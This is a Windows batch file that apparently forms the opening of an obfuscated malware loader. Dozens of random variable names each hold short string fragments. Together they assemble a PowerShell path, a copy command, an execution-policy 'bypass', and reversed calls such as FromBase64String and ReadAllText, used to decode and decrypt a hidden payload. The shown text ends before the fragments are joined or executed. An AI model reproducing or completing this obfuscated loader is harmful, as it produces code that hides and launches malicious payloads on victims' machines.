@echo off
set "CRZTKRkrah=st"
set "AIKbGFVnuW=ws"
set "btJKQGVNYI=.e"
set "jdBhGDqlzT=s\"
set "nkuTRYVrAL=xe"
set "lfYiEljyRq=we"
set "nKvirvqzvq=ow"
set "cREriIskfh=py"
set "fzMAnBpIpP=nd"
set "ESfATuJBxv=ll"
set "snByxNPJea=y "
set "VYQyszvfXB= /"
set "sYksXttkEy=in"
set "aMLpWbKLtY=po"
set "ygPHyfgbQW=he"
set "sTKvNEELPj=co"
set "IzIroJojLs=rS"
set "vEXLbPVAYS=ll"
set "ehIVMPthxU=0\"
set "SHAfWSzpIX=:\"
set "ZpiermTQyz=Po"
set "leivTFqCHY=32"
set "etRYqnOArz=rs"
set "BGAsCmbJAx=Wi"
set "vwveoAHRPH=\v"
set "YKfgbfqqKz=1."
set "jQDcgYrTqH= C"
set "VCojocXFTK=em"
set "WHtSBsUaSu=Sy"
set "hztVHmYPja=he"
set "upgijxJEaf=do"
set "AqHaOrdIwP=\W"
set "ypmiXTNZyN=we"
set "FVPCLtubSD= %~dp0"
set "rzSnVnykcT=cd"
set "DPhGcXpcqz=3); "
set "EoTuiAZXpw=gjYA"
set "lOfeTWhccf=$zZq"
set "AjftechImH= = N"
set "DxGyvbHnjZ=gMod"
set "PCbWJZCimU=saBm"
set "YKdTjuppDa=Hn ="
set "gBoTwpFxWg=join"
set "MIeOGMTnfm=raph"
set "kBGSRGffUQ=esaB"
set "XgCMascHlg=tem."
set "WICjZgSixD=Fs ="
set "IOrPXTFJNx=, $S"
set "pEVHYIuvWp=O.Me"
set "BnzgUGSTVf=gnir"
set "OCKuzsDyWy=ring"
set "rbqOKtVFrT=daeR"
set "ZYtycAJgTr=s75K"
set "SmVoGhZvTC=:('g"
set "lxxScnOjNf=onve"
set "ETSXcnPkCz=RIw."
set "SmqupHcFDv=m(, "
set "yCGdcXkpAg=Fina"
set "RvdrcjIKvC=j.Pa"
set "hjLnrRzvFs=lit("
set "BTjUBubOKq=n ''"
set "vhaUrrsZfi=rity"
set "GgnXxjzvQL=ypto"
set "piQmFuOjPL=[IO."
set "jmUNgWXgBU=bypa"
set "yjpAANedxX=$LjK"
set "QOOpoTXVnY=($Aa"
set "rGDZpxQPFU='gni"
set "xCtlrRGokq=m.IO"
set "rxBZEBHJgF=Bmor"
set "KweEaRdtuU=bIg "
